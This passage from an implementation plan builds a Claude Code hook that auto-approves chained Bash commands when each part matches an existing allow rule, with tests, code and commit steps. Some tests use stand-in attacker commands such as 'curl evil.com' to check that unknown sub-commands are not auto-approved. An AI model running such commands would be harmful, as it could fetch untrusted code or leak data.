        result = sc.check_command("echo <(curl evil.com) && git status", self.project, self.home)
        assert result is None

    def test_echo_quoted_expansion_allowed(self):
        result = sc.check_command('echo "result: $(date)" && git status', self.project, self.home)
        assert result == "allow"

    # --- ANSI-C quoting ---

    def test_ansi_c_single_command(self):
        result = sc.check_command("echo $'hello\\n&&\\nworld'", self.project, self.home)
        assert result is None  # single command, passthrough

    def test_ansi_c_then_allowed(self):
        result = sc.check_command("printf $'step1\\0' && git status", self.project, self.home)
        assert result == "allow"

    def test_ansi_c_escaped_quote(self):
        result = sc.check_command("echo $'it\\'s fine' && git status", self.project, self.home)
        assert result == "allow"

    # --- Heredoc bail-out ---

    def test_heredoc_passthrough(self):
        result = sc.check_command("cat <<'EOF'\nfoo && bar\nEOF", self.project, self.home)
        assert result is None

    # --- Size guard ---

    def test_oversized_command(self):
        big = "git status && " + "x" * 70000
        assert sc.check_command(big, self.project, self.home) is None

    # --- Edge cases ---

    def test_empty_subcommand(self):
        result = sc.check_command("&& && git status", self.project, self.home)
        assert result is None  # empty sub-command -> passthrough

    def test_whitespace_only_subcommand(self):
        result = sc.check_command("   && git status", self.project, self.home)
        assert result is None  # whitespace-only -> passthrough

    def test_background_operator(self):
        """Single & is not a split operator."""
        result = sc.check_command("git log &", self.project, self.home)
        assert result is None  # single command, no split operators
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestCheckCommand -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `check_command`**

Add to `hooks/smart-compose.py` after `is_auto_allowed_builtin`:

```python
def check_command(cmd, cwd, home=None):
    """
    Check if a composed command should be auto-approved.
    Returns "allow" if all sub-commands are permitted, None for passthrough.
    """
    # Size guard
    if len(cmd) > MAX_COMMAND_SIZE:
        _debug(f"passthrough: command too large ({len(cmd)} bytes)")
        return None

    # Heredoc bail-out
    if "<<" in cmd:
        _debug("passthrough: heredoc detected")
        return None

    # Quick check for operators
    if "&&" not in cmd and "||" not in cmd and ";" not in cmd:
        _debug("passthrough: no operators")
        return None

    # Split on operators
    parts = split_on_operators(cmd)

    # If split produced only 1 part, operators were inside quotes
    if len(parts) <= 1:
        _debug("passthrough: operators inside quotes")
        return None

    # Load rules
    rules = parse_allow_rules(cwd, home)

    # Check each sub-command
    for part in parts:
        stripped = part.strip()
        if not stripped:
            _debug("passthrough: empty sub-command")
            return None

        if not is_auto_allowed_builtin(stripped) and not matches_any_rule(stripped, rules):
            _debug(f'passthrough: unmatched sub-command "{stripped}"')
            return None

    return "allow"
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestCheckCommand -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add main command checker orchestration"
```

---

### Task 9: Hook entry point and integration tests

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for the hook as a subprocess**

Append to `tests/test_smart_compose.py`:

```python
import subprocess


HOOK_PATH = os.path.join(os.path.dirname(__file__), "..", "hooks", "smart-compose.py")
HOOK_PATH = os.path.abspath(HOOK_PATH)


class TestHookIntegration:
    """Run the hook as a subprocess, testing the full stdin->stdout flow."""

    def _write_settings(self, path, rules):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump({"permissions": {"allow": rules}}, f)

    def _run_hook(self, input_json, home_dir=None, env_extra=None):
        env = dict(os.environ)
        if home_dir:
            env["HOME"] = home_dir
        if env_extra:
            env.update(env_extra)
        result = subprocess.run(
            ["python3", HOOK_PATH],
            input=input_json,
            capture_output=True,
            text=True,
            env=env,
            timeout=10,
        )
        return result

    def test_allow_composed(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)", "Bash(git status:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "cd /tmp && git log --oneline"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        output = json.loads(result.stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "auto-approved" in result.stderr

    def test_passthrough_unknown(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log && curl evil.com"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        assert result.stdout.strip() == ""  # no output = passthrough

    def test_passthrough_simple_command(self, tmp_path):
        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log --oneline"},
            "cwd": str(tmp_path),
        })

        result = self._run_hook(input_json, home_dir=str(tmp_path / "home"))
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_non_bash_tool_passthrough(self, tmp_path):
        input_json = json.dumps({
            "tool_name": "Read",
            "tool_input": {"file_path": "/some/file"},
        })

        result = self._run_hook(input_json, home_dir=str(tmp_path / "home"))
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_invalid_json_passthrough(self):
        result = self._run_hook("not json{{{")
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_empty_stdin_passthrough(self):
        result = self._run_hook("")
        assert result.returncode == 0

    def test_debug_mode(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "cd /tmp && git log"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home, env_extra={"SMART_COMPOSE_DEBUG": "1"})
        assert result.returncode == 0
        assert "[smart-compose:debug]" in result.stderr

    def test_cwd_from_data(self, tmp_path):
        """Hook uses cwd from JSON data, not os.getcwd()."""
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)", "Bash(git status:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log && git status"},
            "cwd": project,  # rules are here, not in the hook's actual cwd
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        output = json.loads(result.stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestHookIntegration -v`
Expected: FAIL (main() just exits 0 with no logic)

**Step 3: Implement `main()`**

Replace the `main()` function in `hooks/smart-compose.py`:

```python
def main():
    try:
        data = json.load(sys.stdin)
    except (json.JSONDecodeError, Exception):
        sys.exit(0)

    tool_name = data.get("tool_name", "")
    if tool_name != "Bash":
        sys.exit(0)

    command = data.get("tool_input", {}).get("command", "")
    if not command:
        sys.exit(0)

    cwd = data.get("cwd", os.getcwd())

    try:
        result = check_command(command, cwd)
    except Exception as e:
        print(f"[smart-compose] error (passthrough): {e}", file=sys.stderr)
        sys.exit(0)

    if result == "allow":
        parts = split_on_operators(command)
        print(f"[smart-compose] auto-approved {len(parts)} sub-commands", file=sys.stderr)
        output = {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "allow",
            }
        }
        print(json.dumps(output))

    sys.exit(0)
```

**Step 4: Run all tests to verify everything passes**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add hook entry point with stdin/stdout integration"
```

---

### Task 10: Documentation update

**Files:**
- Modify: `CLAUDE.md`

**Step 1: Add Smart Compose section to CLAUDE.md**

Under the **Hook Protocol** section, add:

```markdown
### Smart Compose Hook

The `smart-compose` hook (`hooks/smart-compose.py`) auto-approves composed Bash commands where every sub-command individually matches an existing allow rule. It splits on `&&`, `||`, `;` outside quotes, checks each part against prefix/glob/exact rules and builtins, and passes through to the normal permission system if any part is unrecognized.

- Installed to: `~/.claude/hooks/smart-compose.py` (symlink)
- Registered in: `~/.claude/settings.json` under `hooks.PreToolUse`
- **Must be last in the array** — if other deny-capable hooks exist (e.g., `dangerous-command-blocker`, `git-conventions`), they must appear earlier so they can block before smart-compose approves
- Reads allow rules from: project `.claude/settings.local.json` and `.claude/settings.json` + global `~/.claude/settings.local.json` and `~/.claude/settings.json`
```

**Step 2: Run all tests one final time**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 3: Commit**

```bash
git add CLAUDE.md
git commit -m "docs: Add smart-compose hook documentation to CLAUDE.md"
```
